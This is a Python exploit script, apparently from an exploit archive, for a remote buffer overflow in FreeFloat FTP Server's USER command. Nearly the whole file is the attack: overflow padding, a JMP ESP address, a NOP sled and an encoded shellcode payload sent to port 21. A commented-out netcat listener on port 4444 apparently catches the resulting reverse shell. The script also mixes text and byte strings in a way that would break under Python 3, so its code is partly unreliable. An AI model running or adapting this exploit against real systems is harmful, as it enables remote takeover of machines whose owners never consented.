#Exploit title: FreeFloat FTP Server Remote Command Execution USER Command Buffer Overflow
#Date: 06/12/2012
#Exploit Author: D35m0nd142
#Vendor Homepage: http://www.freefoat.com
#Tested on Windows XP SP3 with Ubuntu 12.04
#Further verified on Windows 10 with Kali 2022.1 by Michael Madden
#!/usr/bin/python
import socket,sys,time,os
#os.system("clear")
def exploit():
	target = "192.168.61.139" #ip.get()
	junk = b"\x41" * 230     # Offest Number --> 230
	eip = b"\x4F\xF4\xA8\x75"  # 0x7E379353   FFE4             JMP ESP
	nops = b"\x90" * 20
	payload =(b"\xb8\xd3\x2b\x5a\x19\xdb\xdc\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
		b"\x58\x31\x46\x15\x83\xc6\x04\x03\x46\x11\xe2\x26\xd7\xb2\x9b"
		b"\xc8\x28\x43\xfc\x41\xcd\x72\x3c\x35\x85\x25\x8c\x3e\xcb\xc9"
		b"\x67\x12\xf8\x5a\x05\xba\x0f\xea\xa0\x9c\x3e\xeb\x99\xdc\x21"
		b"\x6f\xe0\x30\x82\x4e\x2b\x45\xc3\x97\x56\xa7\x91\x40\x1c\x15"
		b"\x06\xe4\x68\xa5\xad\xb6\x7d\xad\x52\x0e\x7f\x9c\xc4\x04\x26"
		b"\x3e\xe6\xc9\x52\x77\xf0\x0e\x5e\xce\x8b\xe5\x14\xd1\x5d\x34"
		b"\xd4\x7d\xa0\xf8\x27\x7c\xe4\x3f\xd8\x0b\x1c\x3c\x65\x0b\xdb"
		b"\x3e\xb1\x9e\xf8\x99\x32\x38\x25\x1b\x96\xde\xae\x17\x53\x95"
		b"\xe9\x3b\x62\x7a\x82\x40\xef\x7d\x45\xc1\xab\x59\x41\x89\x68"
		b"\xc0\xd0\x77\xde\xfd\x03\xd8\xbf\x5b\x4f\xf5\xd4\xd6\x12\x90"
		b"\x2b\x65\x29\xd6\x2c\x75\x32\x47\x45\x44\xb9\x08\x12\x59\x68"
		b"\x6d\xec\x10\x31\xc4\x65\xfc\xa3\x54\xe8\xff\x19\x9a\x15\x83"
		b"\xab\x63\xe2\x9b\xd9\x66\xae\x1c\x31\x1b\xbf\xc8\x35\x88\xc0"
		b"\xd9\x46\x5d\x11\x84\xde\xc4\x4d\x31\x78\x62\xfa\x9d\xb7\x55"
		b"\x30\xf3\x86\x93\x0c\x25\xdf\xea\x42\x08\x2b\x35\xb4\x3a\x32"
		b"\x36\xb9\xcd\xdb\xca\x59\x77\x4d\x47\xd6\x12\xff\xb9\x72\xb0"
		b"\x93\xe5\x57\x07\x4c\xa5\x9d\xcb\xdb\x40\x8c\x97\x8c\xe5\x23"
		b"\x0b\x20\x73\xb7\xdd\xa7\xf7\x5e\x57\x4d\xa4\xf0\xf6\xfe\x27"
		b"\x86\x97\x72\xac\x2e\x0e\x1f\x58\xca\xa2\xf1\xc4\x78\x2e\x35"
		b"\x25\xf6\xc9\x2c\x51\xd8\x24\x96\xab\x36\x77\xde\xf3\x68\x41"
		b"\x2f\x2a\x44\x99\x77\x1d\xd5\x84\xf3\x14\x69\x68\x8c\xa5\xb8"
		b"\x54\x41\x05\x9b\xd7\xa3\xc5\xaf\xb2\xbe\x85\x13\x4f\x24\x12"
		b"\xd9\xdf\x88\xaa\x52\x2e\xee\x6a\xe5\x23\x3e\x0e\x7d\xa6\x1e"
		b"\x93\x47\x74\x2b\x76\xd5\xf4\x8f\x0b\x40\x80\x5a\x9c\xa4\x18"
		b"\xd6\x6d\xb9")
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		sock.connect((target,21))
		print("\n\n[-] Sending exploit ...")
		print(sock.recv(2000))
		sock.send("USER "+junk+eip+nops+payload+"\r\n")
		sock.close()
		#os.system("nc -lvp 4444")
	except Exception as e:
		print(e)
		print("[-] Connection to "+target+" failed! \n")
		sys.exit(0)

exploit()